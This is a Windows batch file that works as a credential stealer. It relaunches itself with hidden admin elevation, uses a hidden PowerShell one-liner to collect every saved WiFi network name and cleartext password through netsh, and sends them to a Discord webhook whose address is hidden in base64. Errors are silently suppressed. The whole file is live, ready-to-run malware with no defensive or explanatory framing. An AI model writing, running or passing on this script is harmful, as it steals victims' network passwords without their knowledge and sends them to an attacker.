@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    REM Extract WiFi credentials and send to Discord in one PowerShell command
    powershell -WindowStyle Hidden -Command "$output = ''; $profiles = netsh wlan show profiles | Select-String 'All User Profile'; foreach($p in $profiles) { $name = ($p -split ':')[1].Trim(); $details = netsh wlan show profile name=\"$name\" key=clear; $pass = $details | Select-String 'Key Content'; if($pass) { $passValue = ($pass -split ':')[1].Trim() } else { $passValue = 'No password' }; $output += \"WiFi: $name`nPassword: $passValue`n---`n\" }; if(-not $output) { $output = 'No WiFi profiles found' }; try { $encrypted = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDQxNTY3NTU2NDE2MzE2NC9WRVFGVUhnSEZIcTZjemxyUHUxQ0NJQUJOLWJiM09kTFRYVGg2OE1oS21fQ0VINFZQbURZa3dWc1ZzdS1naVVLRVBtTw=='; $bytes = [System.Convert]::FromBase64String($encrypted); $webhook = [System.Text.Encoding]::UTF8.GetString($bytes); if($output.Length -gt 1800) { $output = $output.Substring(0,1800) + '...(truncated)' }; $payload = @{ content = \"**WiFi Credentials Captured!**`n``````$output``````\" } | ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' } catch { }"
    exit /b
) else (
    REM Request admin privileges
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
